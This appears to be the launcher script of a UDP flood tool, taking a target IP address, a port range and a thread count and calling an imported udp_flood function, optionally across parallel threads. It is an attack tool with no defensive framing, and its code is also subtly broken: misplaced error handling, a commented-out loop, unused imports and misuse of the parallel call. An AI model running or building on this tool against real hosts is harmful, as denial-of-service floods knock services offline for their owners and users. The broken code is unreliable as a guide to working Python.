from multiprocessing import Pool
from sys import argv
from os import fork

from joblib import Parallel, delayed

from flood import udp_flood
from cfg import SSL_LOG, FLAGS, THREADS 

if __name__ == '__main__':
    try:
        ipv4 = argv[1]
        ports = argv[2].split('-')
        if len(argv) == 3: udp_flood(ipv4,ports,True)
        else:
            threads = argv[3]
            func = udp_flood(ipv4, ports, False) 
            Parallel(n_jobs = threads, prefer='threads')(delayed(func))# for i in range(threads))

    except KeyboardInterrupt:
        print('pass in arguments as: <ip> <start_port> <end_port> <threads>')
